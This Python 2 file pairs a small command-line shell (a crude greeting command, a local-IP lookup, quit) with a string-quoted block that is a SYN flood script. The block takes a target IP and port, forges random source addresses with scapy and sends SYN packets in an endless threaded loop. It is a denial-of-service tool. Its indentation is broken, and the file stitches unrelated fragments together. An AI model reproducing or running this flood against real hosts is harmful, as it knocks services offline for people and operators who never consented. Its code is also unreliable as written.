import socket, random, sys, threading
import cmd
import string, sys
from scapy.all import *
 
class CLI(cmd.Cmd):

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = '> '

    def do_fuck(self, arg):
	"""shits gettin fucked up"""
        print "hello again", arg, "!"

    def do_ip(self, arg):
	"""Gets local IP address"""
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	ip = (s.getsockname()[0])
	print ip
	s.close()
    
    def help_hello(self):
        print "syntax: hello [message]",
        print "-- prints a hello message"

    def do_quit(self, arg):
        sys.exit(1)

    def help_quit(self):
        print "syntax: quit",
        print "-- terminates the application"

    # shortcuts
    do_q = do_quit

#
# try it out

cli = CLI()
cli.cmdloop()

   
'''

if len(sys.argv) != 3:
    print "Usage: %s <Target IP> <Port>" % sys.argv[0]
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

total = 0
conf.iface='en1';#network card XD

class sendSYN(threading.Thread):
    global target, port
    def __init__(self):
    threading.Thread.__init__(self)
    def run(self):
    i = IP()
    i.src = "%i.%i.%i.%i" %
(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
    i.dst = target

    t = TCP()
    t.sport = random.randint(1,65535)
    t.dport = port
    t.flags = 'S'

    send(i/t, verbose=0)

print "Flooding %s:%i with SYN packets." % (target, port)
while 1:
    sendSYN().start()
    total += 1
    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
'''
